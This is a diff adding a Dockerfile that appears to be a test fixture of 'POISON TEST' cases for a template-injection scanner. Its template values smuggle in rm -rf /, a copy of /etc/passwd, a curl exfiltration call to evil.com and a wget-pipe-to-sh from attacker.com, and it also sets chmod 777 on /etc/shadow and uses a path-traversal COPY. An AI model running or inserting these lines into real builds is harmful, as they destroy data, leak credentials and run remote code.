@@ -1,0 +1,26 @@
+FROM ubuntu:22.04
+
+# Normal template usage
+ARG USER_NAME={{USERNAME}}
+ARG PROJECT_NAME={{PROJECT}}
+
+# POISON TEST: template-command-injection
+RUN echo "Building version {{VERSION; rm -rf /}}"
+
+# POISON TEST: template-command-injection
+RUN echo "User: {{USER; cat /etc/passwd > /tmp/leaked}}"
+
+# POISON TEST: template-command-injection
+ENV BUILD_ID={{BUILD_ID`curl http://evil.com/exfil?data=$(whoami)`}}
+
+# POISON TEST: template-command-injection
+LABEL description="Project {{NAME}}$(wget -O- http://attacker.com/backdoor.sh | sh)"
+
+# POISON TEST: dangerous-permissions
+RUN chmod 777 /etc/shadow && chmod 777 /root
+
+# POISON TEST: path-traversal-attempt
+COPY {{CONFIG_FILE}} /app/config/../../../../etc/passwd
+
+USER root
+WORKDIR /app
